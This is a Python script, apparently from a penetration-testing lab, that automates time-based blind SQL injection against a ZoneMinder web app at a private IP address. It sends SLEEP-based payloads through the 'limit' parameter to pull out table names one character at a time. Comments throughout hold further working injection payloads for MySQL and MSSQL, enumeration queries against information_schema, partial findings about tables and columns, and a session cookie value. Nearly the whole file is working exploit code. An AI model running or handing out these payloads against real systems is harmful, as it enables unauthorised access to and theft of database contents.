#!/usr/bin/python3
# ? I wonder if you can use mysql cases to try more characters at a time and speed up this process?
# 

import requests
import time
def main():

		# ' UNION SELECT NULL,NULL,substr((SELECT(@@version), 1, 1); #
		# 'DECLARE @index INT SET @index = {char_index} DECLARE @var AS varchar (130) SELECT @var = (SELECT TOP 1 username FROM users); WHILE (@index <= 127) BEGIN IF(SUBSTRING(@var,{hash_index},1) = CHAR(@index)) BREAK; ELSE BEGIN WAITFOR DELAY '0:0:1' END SET @index = @index + 1 END--
		# REMEMBER TO ATTACH THE COOKIE AS A HEADER, CHECK THE requests DOCS JSESSIONID=36364A4B79D40FD1C062783D26682F8C
		# ' UNION SELECT NULL,NULL,IF((substr((SELECT user()),{hash_index},1) = char({char_index})),SLEEP(3),NULL)
		# URL ENCODE THIS WHEN COMPLETE:
		# UNION SELECT IF((substr("A", 1, 1) = char(65)),SLEEP(5),1) #
		# ' UNION SELECT IF((substr(@@version,{hash_index},1) = char({char_index})),SLEEP(3),1) #
		# I should've mentioned in my comments that requests AUTOMATICALLY URL ENCODES, SO THERE WAS NO NEED TO DUMP URL-ENCODED PAYLOADS IN HERE.
		# ' UNION SELECT IF((substr((SELECT user()),{hash_index},1) = char({char_index})),SLEEP(3),1) #
		# How can I guess complete words?
			# MAYBE LIKE THIS:	
				#' UNION SELECT IF(((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ORDER BY table_name LIMIT 1 OFFSET 1) = 'Customers'),SLEEP(3),1) #
		# TABLE BRUTE FORCE PAYLOAD: 
			# ' UNION SELECT IF((substr((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ORDER BY table_name LIMIT 1 OFFSET {OFFSET}),{hash_index},1) = char({char_index})),SLEEP(3),1) #
		#

		# Tables:
		# 
		# Columns payload (fixed it up using LIKE, since I figured the spaces at the end of some of them would fuck things up:

			# ' UNION SELECT IF((substr((SELECT column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name LIKE '%{TABLE}%' ORDER BY column_name LIMIT 1 OFFSET {OFFSET}),{hash_index},1) = char({char_index})),SLEEP(3),1) #
		#USER Columns:
			#IMPORTANT NOTE: While I was brute forcing for offset 2, the first run showed first letter b and then the 2nd run showed capital B and completed it into BYte... The case changes?
			#ACCe(0)? ,BINloG_BytES_wRITTEn(1), BUsy(2), BYte(3)
		#USER_rOLe Columns:
			# ROLE_ID, USE%_ID (USER_ID?) ???
		# HIBERNATE_SEQUENCE Columns
			# NEXT_VAL
		# ISSUE Columns:
			# ID, Message, PR?
		# ROLE Columns:
			# 

	host = 'http://192.168.228.52/zm/index.php'
	char_index = 0
	hash_index = 1
	hash = ""
	space_counter = 0
	# view=request&request=log&task=query&limit=100;(SELECT * FROM USERS)#&minTime=1466674406.084434
	post_data = {
		"view": "request",
		"request": "log",
		"task": "query",
		"limit": "",
		"minTime": "1466674406.084434"
	}
	# TABELE(OFFSET): ACCOUNTS(0), COND_INSTANCE(1), CONFIG(2), CONTROLPRESETS(3), COntRoLS(4), DEViCES, EVentS, EVentS_stAGes_cuRrENT, EVentS_stAGes_histORY, EVentS_stAGes_histORY_loNg
	# TABLE = ""
	for OFFSET in range(1, 10):
		char_index = 0
		space_counter = 0
		if(len(hash) == 0 and OFFSET > 1):
			print("Empty result, quitting!")
			break
		hash = ""
		hash_index = 1
		print(f"OFFSET: {OFFSET}")
		while(True):
			
			payload=f";(SELECT IF((substr((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ORDER BY table_name LIMIT 1 OFFSET {OFFSET}),{hash_index},1) = char({char_index})),SLEEP(3),1))#"
			#payload=f"' UNION SELECT IF((substr((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ORDER BY table_name LIMIT 1 OFFSET 3),{hash_index},1) = char({char_index})),SLEEP(3),1) #"
			post_data["limit"] = f"100{payload}"
			#print(f"Running: char_index: {char_index}\thash_index: {hash_index}")
			r = requests.post(host, data=post_data)
			# THANKS STACK OVERFLOW <3
			delta = int(r.elapsed.total_seconds())
			#print("delta: " + str(delta))
			if delta >= 3:
				if (char_index >= 127):
					print("[!] Finished outside of ASCII range")
					char_index = 0
				hash += chr(char_index)
				print(f"Found a char: {chr(char_index)}({char_index})! total: " + hash)
				hash_index += 1
				if(char_index <= 32):
					print("[*] Got a bad char, might be the end!")
					space_counter += 1
					char_index = 0
				if(space_counter > 1):
					#print(f"[!!] END OF brute force.\n Result: {hash}")
					print(f"[!] Finished OFFSET {OFFSET}\nGot result: {hash} (Too many bad chars!)")
					space_counter = 0
					break
				#char_index = 0
			if (char_index >= 127):
				if(len(hash) == 0):
					print("Got an empty result here!")
					break
				char_index = 0
			char_index += 1
if __name__ == '__main__':
	main()


